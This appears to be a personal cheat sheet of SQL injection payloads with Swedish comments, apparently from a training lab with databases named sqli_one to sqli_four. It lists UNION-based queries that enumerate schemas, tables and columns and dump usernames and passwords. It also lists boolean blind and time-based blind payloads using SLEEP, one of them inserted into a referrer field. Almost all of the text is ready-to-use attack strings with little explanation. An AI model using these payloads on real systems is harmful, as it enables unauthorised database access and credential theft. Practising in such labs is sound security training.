# SQL-injections

### Basics
;-- bindestreck = kommentar efter

0 UNION SELECT 1,2,database()

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

	
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people" 

 
**Vid True/False return, behöver man ta en bokstav i taget för tabell och table, likt det nedan**

admin123' UNION SELECT 1,2,3 where database() like 's%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

Timebased
, fördröjer request för att verifiera resultat, fel går fort, rätt tar tid

referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

‘UNION SELECT SLEEP(1),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'use%';--


UNION SELECT SLEEP(1),2 FROM information_schema.columns where table_name='users' and column_name like 'usern%';--

UNION SELECT SLEEP(1),2 FROM information_schema.columns where table_name='users' and column_name like 'password';--

UNION SELECT SLEEP(1),2 FROM sqli_four.users where username like "admin" and password like "4961" ;--

